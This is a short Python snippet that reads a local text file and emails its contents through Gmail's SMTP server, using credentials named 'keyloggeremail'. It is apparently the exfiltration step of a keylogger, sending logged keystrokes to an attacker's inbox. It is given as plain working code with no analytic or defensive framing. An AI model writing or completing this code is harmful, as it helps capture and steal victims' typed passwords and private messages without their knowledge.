import smtplib
def sendingMail():
    text=open("text.txt","r")
    text2=text.read()

    mail= smtplib.SMTP('smtp.gmail.com', 587)
    mail.ehlo()
    mail.starttls()
    mail.login('keyloggeremail','password')
    mail.sendmail('keyloggeremail','youremail',text2)
    mail.close()